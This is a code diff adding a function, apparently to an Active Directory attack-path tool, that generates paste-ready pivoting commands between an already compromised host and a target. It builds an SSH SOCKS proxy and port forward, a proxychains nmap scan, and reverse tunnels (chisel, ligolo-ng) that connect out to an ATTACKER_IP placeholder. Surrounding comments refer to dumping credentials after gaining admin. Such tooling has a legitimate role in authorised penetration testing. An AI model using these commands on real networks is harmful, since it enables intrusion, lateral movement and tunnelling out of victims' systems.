@@ -388,6 +388,29 @@
     return out.slice(0, 12);
   }
 
+  // ── concrete pivot route between two hosts (AD attack-path) ───────────────
+  // pivotFor lists the generic pivoting toolkit; pivotRoute fills it in for a
+  // specific hop. Given the IP of a box you already own (the pivot you tunnel
+  // through) and the IP of the next, not-yet-owned host (the frontier target),
+  // it returns the canonical relay one-liners with both IPs substituted — the
+  // SOCKS proxy, the proxychains scan, the single-port forward, and the two
+  // self-hosted relays (chisel, ligolo-ng). Pure and reference-free: these are
+  // the irreducible route commands, so the pivot path from the graph becomes
+  // something you can paste. ATTACKER_IP stays a placeholder (the engine has no
+  // notion of the operator's own address).
+  function pivotRoute(pivotIp, targetIp) {
+    var p = String(pivotIp || "").trim() || "PIVOT_IP";
+    var tg = String(targetIp || "").trim() || "TARGET_IP";
+    return [
+      { title: "SSH dynamic SOCKS through the pivot", group: "socks", cmd: "ssh -D 1080 -N user@" + p },
+      { title: "proxychains a full scan at the target", group: "scan", cmd: "proxychains -q nmap -sT -Pn -p- " + tg },
+      { title: "SSH local-forward one port (e.g. RDP)", group: "forward", cmd: "ssh -L 3389:" + tg + ":3389 -N user@" + p },
+      { title: "chisel reverse SOCKS — server on attacker", group: "chisel", cmd: "chisel server -p 8080 --reverse" },
+      { title: "chisel client — run on the pivot", group: "chisel", cmd: "chisel client ATTACKER_IP:8080 R:1080:socks" },
+      { title: "ligolo-ng agent — run on the pivot", group: "ligolo", cmd: "./agent -connect ATTACKER_IP:11601 -ignore-cert" }
+    ];
+  }
+
   // ── post-admin loot / post-exploitation (OS-aware, DB-sourced) ───────────
   // Once you own the box (root/SYSTEM), the move is to harvest and hold: dump
   // credentials to move laterally, then take situational awareness, hunt stored
@@ -496,6 +519,7 @@
     vulnsFor: vulnsFor,
     privescFor: privescFor,
     pivotFor: pivotFor,
+    pivotRoute: pivotRoute,
     lootFor: lootFor,
     inferOs: inferOs,
     rowsForService: rowsForService,
